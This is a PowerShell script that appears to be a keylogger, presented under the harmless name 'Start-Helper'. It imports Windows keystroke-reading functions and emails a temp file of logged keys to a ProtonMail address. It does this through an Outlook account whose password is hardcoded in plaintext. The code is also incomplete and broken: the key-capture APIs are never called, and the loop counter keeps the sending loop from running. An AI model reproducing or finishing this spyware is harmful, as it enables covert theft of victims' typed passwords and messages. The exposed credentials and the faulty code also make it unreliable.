$TimesToRun = 0.5
$RunTimeP = 0.5    # Time in minutes
$From = "luccasmachado001@outlook.com"
$Pass = "hbzgnuqauqooxcbq"
$To = "carlosalberto58@protonmail.com"
$Subject = "pragmatica"
$body = "report"
$SMTPServer = "smtp-mail.outlook.com"    # Outlook SMTP
$SMTPPort = "587"
$credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)

# Function to start the helper
function Start-Helper($Path="$env:temp\help.txt") {
    $signatures = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    $TimeStart = Get-Date
    $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
    $TimeNow = Get-Date

    while ($TimesToRun -ge 1) {
        while ($TimeEnd -ge $TimeNow) {
            $TimeLeft = $TimeEnd - (Get-Date)
            Write-Host -NoNewline "Time left to send email: $($TimeLeft.ToString("mm\:ss"))`r"
            Start-Sleep -Seconds 1
            $TimeNow = Get-Date
        }

        if (Test-Path $Path) {
            Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl

            # Reset variables for next iteration
            $TimeStart = Get-Date
            $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
            $TimeNow = Get-Date
            $TimesToRun--
            Write-Host "Email sent. Waiting 30 seconds to send next email..."
            Start-Sleep -Seconds 30
        } else {
            Write-Host "No keystrokes captured. Waiting for input..."
            Start-Sleep -Seconds 5
        }
    }
    exit 1
}

Start-Helper
